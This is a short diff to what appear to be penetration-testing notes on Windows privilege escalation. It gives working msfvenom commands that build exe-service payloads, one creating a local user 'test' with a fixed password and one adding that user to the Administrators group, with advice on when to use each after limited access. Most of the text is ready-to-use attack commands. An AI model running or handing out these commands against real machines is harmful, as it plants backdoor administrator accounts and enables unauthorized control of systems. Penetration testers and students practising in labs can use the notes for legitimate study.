@@ -1,5 +1,5 @@
-Test this with an add user payload first
-Remember to use exe-service payload as I seemed to have issues getting a standard exe payload to work
+Test this with an add user payload if we can't add current user to admin group or change admin password
+Also use exe-service payload- it can work in both cases but it makes sense to use an exe-service payload.
 
   msfvenom -p windows/adduser USER=test PASS=Easyas123! -f exe-service -o adduser.exe
   
@@ -7,4 +7,3 @@ Then:
 
   msfvenom -p windows/x64/exec CMD="cmd.exe /c 'net localgroup Administrators test /add'" -f exe-service -o admuser.exe
 
-If we have limited access (e.g. through a web app exploit) then we'll have to add the current user to the Administrators group or change Administrator password
